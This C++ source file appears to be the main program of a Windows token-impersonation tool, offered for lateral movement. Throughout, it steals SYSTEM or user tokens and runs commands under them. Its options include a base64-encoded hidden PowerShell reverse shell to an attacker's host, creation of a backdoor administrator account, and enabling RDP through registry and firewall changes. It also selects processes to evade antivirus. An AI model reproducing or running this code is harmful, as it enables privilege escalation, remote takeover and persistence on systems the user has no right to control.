#include "tokenImpersonate.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void PrintBanner() {
    printf("\n");
    printf("  ========================================================\n");
    printf("  ||                                                    ||\n");
    printf("  ||        Token Impersonation Tool v3.0               ||\n");
    printf("  ||        Lateral Movement via Token Theft            ||\n");
    printf("  ||                                                    ||\n");
    printf("  ========================================================\n");
    printf("\n");
}

void PrintSeparator() {
    printf("  --------------------------------------------------------\n");
}

void PrintPrivilegeStatus(BOOL hasPrivilege, const char* privilegeName) {
    if (hasPrivilege) {
        printf("  [+] %s: ENABLED\n", privilegeName);
    } else {
        printf("  [-] %s: DISABLED\n", privilegeName);
    }
}

void PrintUsage(char* programName) {
    PrintSeparator();
    printf("  COMMAND-LINE USAGE:\n");
    PrintSeparator();
    printf("  %s list                         - List all processes\n", programName);
    printf("  %s auto                         - Auto-impersonate SYSTEM\n", programName);
    printf("  %s <PID>                        - Impersonate specific PID\n", programName);
    printf("\n");
    printf("  BRUTE FORCE BY USERNAME:\n");
    printf("  %s brute <USERNAME>             - Try all processes for user\n", programName);
    printf("  %s brute <USERNAME> cmd         - Spawn cmd.exe as user\n", programName);
    printf("  %s brute <USERNAME> shell <IP> <PORT> - Reverse shell\n", programName);
    printf("\n");
    printf("  POST-EXPLOITATION OPTIONS:\n");
    printf("  %s <PID> shell <LHOST> <LPORT>  - Spawn reverse shell\n", programName);
    printf("  %s <PID> adduser <USER> <PASS>  - Create admin user\n", programName);
    printf("  %s <PID> rdp                    - Enable RDP\n", programName);
    printf("\n");
    printf("  EXAMPLES:\n");
    printf("  %s list\n", programName);
    printf("  %s auto\n", programName);
    printf("  %s brute \"BUILTIN\\\\Administrators\"\n", programName);
    printf("  %s brute Administrator shell 192.168.19.128 4444\n", programName);
    printf("  %s 1234 adduser hacker Pass123!\n", programName);
    PrintSeparator();
}

void ListProcesses(tokenImpersonate* tokenImp) {
    printf("\n");
    PrintSeparator();
    printf("  ENUMERATING PROCESSES...\n");
    PrintSeparator();
    
    PProcessList processList = tokenImp->EnumerateProcesses();
    
    printf("\n  Found %d accessible processes:\n\n", processList->count);
    
    printf("  %-8s | %-30s | %-45s | %-8s | %s\n", 
           "PID", "Process Name", "Owner (User Account)", "Elevated", "Integrity");
    printf("  ---------|--------------------------------|");
    printf("-----------------------------------------------|----------|----------\n");
    
    for (int i = 0; i < processList->count; i++) {
        char processNameNarrow[260];
        WideCharToMultiByte(CP_UTF8, 0, processList->processes[i].Name_Process, -1, 
                           processNameNarrow, 260, NULL, NULL);
        
        printf("  %-8lu | %-30s | %-45s | %-8s | %s\n", 
            processList->processes[i].PID,
            processNameNarrow,
            processList->processes[i].Domain_User_Name,
            processList->processes[i].IsElevated ? "YES" : "NO",
            processList->processes[i].IntegrityLevel);
    }
    
    printf("\n");
    printf("  Legend:\n");
    printf("    Elevated: YES = Running with admin rights | NO = Standard user\n");
    printf("    Integrity: SYSTEM > HIGH > MEDIUM > LOW > UNTRUSTED\n");
    printf("\n");
    
    delete processList;
}

void CreateReverseShell(tokenImpersonate* tokenImp, int targetPID, char* lhost, char* lport) {
    printf("\n");
    PrintSeparator();
    printf("  SPAWNING REVERSE SHELL\n");
    PrintSeparator();
    printf("  [*] Target PID: %d\n", targetPID);
    printf("  [*] Callback: %s:%s\n", lhost, lport);
    printf("  [*] Make sure you have a listener running:\n");
    printf("      nc -lvnp %s\n", lport);
    printf("\n  [*] Creating base64 encoded payload...\n");
    
    // Shorter PowerShell script for base64
    char psPayload[1024];
    snprintf(psPayload, sizeof(psPayload),
        "$c=New-Object Net.Sockets.TCPClient('%s',%s);"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
        "$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()}",
        lhost, lport);
    
    // Convert to UTF-16LE and base64
    WCHAR widePayload[1024];
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, psPayload, -1, widePayload, 1024) - 1;
    
    unsigned char* bytes = (unsigned char*)widePayload;
    int byteLen = wideLen * 2;
    
    // Base64 encode
    int base64MaxLen = ((byteLen + 2) / 3) * 4 + 1;
    char* base64Payload = (char*)malloc(base64MaxLen);
    
    const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int pos = 0;
    
    for (int i = 0; i < byteLen; i += 3) {
        unsigned int v = bytes[i] << 16;
        if (i + 1 < byteLen) v |= bytes[i + 1] << 8;
        if (i + 2 < byteLen) v |= bytes[i + 2];
        
        base64Payload[pos++] = b64[(v >> 18) & 0x3F];
        base64Payload[pos++] = b64[(v >> 12) & 0x3F];
        base64Payload[pos++] = (i + 1 < byteLen) ? b64[(v >> 6) & 0x3F] : '=';
        base64Payload[pos++] = (i + 2 < byteLen) ? b64[v & 0x3F] : '=';
    }
    base64Payload[pos] = '\0';
    
    printf("  [*] Base64 length: %d bytes\n", pos);
    
    // Use shorter PowerShell invocation
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c powershell -e %s", base64Payload);
    
    WCHAR wCmd[4096];
    MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wCmd, 4096);
    
    free(base64Payload);
    
    printf("  [*] Executing base64 encoded payload...\n");
    int newPID = tokenImp->ImpersonateTokenAndExecuteCommand(targetPID, wCmd);
    
    if (newPID > 0) {
        printf("\n  [+++] SUCCESS! [+++]\n");
        printf("  [+] Reverse shell spawned with PID: %d\n", newPID);
        printf("  [+] Check your netcat listener!\n");
    } else {
        printf("\n  [!!!] FAILED! [!!!]\n");
    }
    
    printf("\n");
    PrintSeparator();
}

void CreateAdminUser(tokenImpersonate* tokenImp, int targetPID, char* username, char* password) {
    printf("\n");
    PrintSeparator();
    printf("  CREATING ADMIN USER\n");
    PrintSeparator();
    printf("  [*] Target PID: %d\n", targetPID);
    printf("  [*] Username: %s\n", username);
    printf("  [*] Password: %s\n", password);
    printf("\n  [*] Executing commands...\n");
    
    char command1[512];
    snprintf(command1, sizeof(command1), 
        "cmd.exe /c net user %s %s /add", username, password);
    
    WCHAR wCommand1[512];
    MultiByteToWideChar(CP_UTF8, 0, command1, -1, wCommand1, 512);
    
    printf("  [*] Creating user...\n");
    int pid1 = tokenImp->ImpersonateTokenAndExecuteCommand(targetPID, wCommand1);
    
    if (pid1 > 0) {
        Sleep(1000);
        
        char command2[512];
        snprintf(command2, sizeof(command2), 
            "cmd.exe /c net localgroup Administrators %s /add", username);
        
        WCHAR wCommand2[512];
        MultiByteToWideChar(CP_UTF8, 0, command2, -1, wCommand2, 512);
        
        printf("  [*] Adding to Administrators group...\n");
        int pid2 = tokenImp->ImpersonateTokenAndExecuteCommand(targetPID, wCommand2);
        
        if (pid2 > 0) {
            printf("\n  [+++] SUCCESS! [+++]\n");
            printf("  [+] User '%s' created with password '%s'\n", username, password);
            printf("  [+] User added to Administrators group\n");
            printf("  [+] You can now connect with:\n");
            printf("      evil-winrm -i <target> -u %s -p %s\n", username, password);
        }
    } else {
        printf("\n  [!!!] FAILED! [!!!]\n");
    }
    
    printf("\n");
    PrintSeparator();
}

void EnableRDP(tokenImpersonate* tokenImp, int targetPID) {
    printf("\n");
    PrintSeparator();
    printf("  ENABLING RDP\n");
    PrintSeparator();
    printf("  [*] Target PID: %d\n", targetPID);
    printf("\n  [*] Executing commands...\n");
    
    WCHAR command1[] = L"cmd.exe /c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f";
    
    printf("  [*] Enabling RDP in registry...\n");
    int pid1 = tokenImp->ImpersonateTokenAndExecuteCommand(targetPID, command1);
    
    if (pid1 > 0) {
        Sleep(1000);
        
        WCHAR command2[] = L"cmd.exe /c netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes";
        
        printf("  [*] Enabling RDP firewall rule...\n");
        int pid2 = tokenImp->ImpersonateTokenAndExecuteCommand(targetPID, command2);
        
        if (pid2 > 0) {
            printf("\n  [+++] SUCCESS! [+++]\n");
            printf("  [+] RDP enabled on target\n");
            printf("  [+] You can now RDP to the target:\n");
            printf("      xfreerdp /v:<target> /u:<user> /p:<pass>\n");
        }
    } else {
        printf("\n  [!!!] FAILED! [!!!]\n");
    }
    
    printf("\n");
    PrintSeparator();
}

void AutoImpersonate(tokenImpersonate* tokenImp) {
    printf("\n");
    PrintSeparator();
    printf("  AUTO-IMPERSONATION MODE\n");
    PrintSeparator();
    
    printf("  [*] Searching for optimal SYSTEM process (avoiding AV detection)...\n");
    
    int targetPID = tokenImp->FindBestSystemProcess();
    
    if (targetPID != 0) {
        printf("\n  [*] Spawning cmd.exe...\n");
        int newPID = tokenImp->ImpersonateTokenAndSpawnNewProcess(targetPID, (PWCHAR)L"cmd.exe");
        
        if (newPID > 0) {
            printf("\n  [+++] SUCCESS! [+++]\n");
            printf("  [+] New cmd.exe PID: %d (running as SYSTEM)\n", newPID);
            printf("  [+] Check the target machine for a new command window\n");
        } else {
            printf("\n  [!!!] FAILED! [!!!]\n");
            printf("  [-] Could not create process - try a different PID manually\n");
        }
    } else {
        printf("\n  [!] No accessible SYSTEM processes found\n");
        printf("  [!] Try listing all processes to find a target\n");
    }
    
    printf("\n");
    PrintSeparator();
}

void BruteForceByUsername(tokenImpersonate* tokenImp, int argc, char* argv[]) {
    if (argc < 3) {
        printf("[!] Usage: %s brute <USERNAME>\n", argv[0]);
        return;
    }
    
    char* username = argv[2];
    
    printf("\n");
    PrintSeparator();
    printf("  BRUTE FORCE TOKEN IMPERSONATION\n");
    PrintSeparator();
    printf("  [*] Target Username: %s\n", username);
    printf("\n");
    
    if (argc >= 4) {
        if (strcmp(argv[3], "cmd") == 0) {
            tokenImp->BruteForceImpersonateByUsername(username, NULL);
        }
        else if (strcmp(argv[3], "shell") == 0 && argc >= 6) {
            // Build PowerShell payload
            char psPayload[4096];
            snprintf(psPayload, sizeof(psPayload),
                "$client=New-Object System.Net.Sockets.TCPClient('%s',%s);"
                "$stream=$client.GetStream();"
                "[byte[]]$bytes=0..65535|%%{0};"
                "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
                "$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);"
                "$sendback=(iex $data 2>&1|Out-String);"
                "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
                "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);"
                "$stream.Flush()};"
                "$client.Close()",
                argv[4], argv[5]);
            
            // Base64 encode
            WCHAR widePayload[4096];
            MultiByteToWideChar(CP_UTF8, 0, psPayload, -1, widePayload, 4096);
            
            int wideLen = wcslen(widePayload);
            DWORD base64Len = (wideLen * 2 * 4 / 3) + 4;
            char* base64Payload = (char*)malloc(base64Len);
            
            const char* base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            unsigned char* bytes = (unsigned char*)widePayload;
            int byteLen = wideLen * 2;
            int outPos = 0;
            
            for (int i = 0; i < byteLen; i += 3) {
                unsigned int val = bytes[i] << 16;
                if (i + 1 < byteLen) val |= bytes[i + 1] << 8;
                if (i + 2 < byteLen) val |= bytes[i + 2];
                
                base64Payload[outPos++] = base64Chars[(val >> 18) & 0x3F];
                base64Payload[outPos++] = base64Chars[(val >> 12) & 0x3F];
                base64Payload[outPos++] = (i + 1 < byteLen) ? base64Chars[(val >> 6) & 0x3F] : '=';
                base64Payload[outPos++] = (i + 2 < byteLen) ? base64Chars[val & 0x3F] : '=';
            }
            base64Payload[outPos] = '\0';
            
            char finalCommand[8192];
            snprintf(finalCommand, sizeof(finalCommand),
                "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand %s",
                base64Payload);
            
            WCHAR wCommand[8192];
            MultiByteToWideChar(CP_UTF8, 0, finalCommand, -1, wCommand, 8192);
            
            free(base64Payload);
            
            printf("  [*] Reverse shell target: %s:%s\n", argv[4], argv[5]);
            printf("  [*] Make sure you have a listener: nc -lvnp %s\n\n", argv[5]);
            
            tokenImp->BruteForceImpersonateByUsername(username, wCommand);
        }
        else if (strcmp(argv[3], "adduser") == 0 && argc >= 6) {
            char command[512];
            snprintf(command, sizeof(command), 
                "cmd.exe /c net user %s %s /add & net localgroup Administrators %s /add",
                argv[4], argv[5], argv[4]);
            
            WCHAR wCommand[512];
            MultiByteToWideChar(CP_UTF8, 0, command, -1, wCommand, 512);
            
            printf("  [*] Creating user: %s\n\n", argv[4]);
            
            tokenImp->BruteForceImpersonateByUsername(username, wCommand);
        }
    } else {
        tokenImp->BruteForceImpersonateByUsername(username, NULL);
    }
    
    printf("\n");
    PrintSeparator();
}

int main(int argc, char* argv[]) {
    tokenImpersonate tokenImp;
    
    PrintBanner();
    
    PrintSeparator();
    printf("  CHECKING PRIVILEGES\n");
    PrintSeparator();
    
    printf("  [*] Attempting to enable SeDebugPrivilege...\n");
    BOOL hasDebug = tokenImp.EnableDebugPrivilege();
    
    printf("  [*] Checking for SeImpersonatePrivilege...\n");
    BOOL hasImpersonate = tokenImp.hasImpersonatePrivilege();
    
    printf("\n  PRIVILEGE STATUS:\n");
    PrintPrivilegeStatus(hasDebug, "SeDebugPrivilege        ");
    PrintPrivilegeStatus(hasImpersonate, "SeImpersonatePrivilege  ");
    printf("\n");
    
    if (!hasImpersonate) {
        PrintSeparator();
        printf("  [!!!] CRITICAL ERROR [!!!]\n");
        printf("  [-] SeImpersonatePrivilege is NOT available!\n");
        PrintSeparator();
        Sleep(3000);
        return -1;
    }
    
    PrintSeparator();
    printf("  [+] Ready for token impersonation!\n");
    PrintSeparator();
    
    if (argc >= 2) {
        if (strcmp(argv[1], "list") == 0) {
            ListProcesses(&tokenImp);
            return 0;
        }
        
        if (strcmp(argv[1], "auto") == 0) {
            AutoImpersonate(&tokenImp);
            return 0;
        }
        
        if (strcmp(argv[1], "brute") == 0) {
            BruteForceByUsername(&tokenImp, argc, argv);
            return 0;
        }
        
        int targetPID = atoi(argv[1]);
        
        if (targetPID > 0 && argc >= 3) {
            if (strcmp(argv[2], "shell") == 0 && argc >= 5) {
                CreateReverseShell(&tokenImp, targetPID, argv[3], argv[4]);
                return 0;
            }
            else if (strcmp(argv[2], "adduser") == 0 && argc >= 5) {
                CreateAdminUser(&tokenImp, targetPID, argv[3], argv[4]);
                return 0;
            }
            else if (strcmp(argv[2], "rdp") == 0) {
                EnableRDP(&tokenImp, targetPID);
                return 0;
            }
        }
        else if (targetPID > 0) {
            printf("\n");
            PrintSeparator();
            printf("  IMPERSONATING SPECIFIC PROCESS\n");
            PrintSeparator();
            printf("  [*] Target PID: %d\n", targetPID);
            printf("  [*] Spawning cmd.exe...\n");
            
            int newPID = tokenImp.ImpersonateTokenAndSpawnNewProcess(targetPID, (PWCHAR)L"cmd.exe");
            
            if (newPID > 0) {
                printf("\n");
                printf("  [+++] SUCCESS! [+++]\n");
                printf("  [+] New cmd.exe PID: %d\n", newPID);
                printf("  [+] Check for new command window!\n");
            } else {
                printf("\n");
                printf("  [!!!] FAILED! [!!!]\n");
            }
            
            printf("\n");
            PrintSeparator();
            return 0;
        }
        
        printf("\n  [!] Invalid arguments\n");
        PrintUsage(argv[0]);
        return -1;
    }
    
    PrintUsage(argv[0]);
    return 0;
}
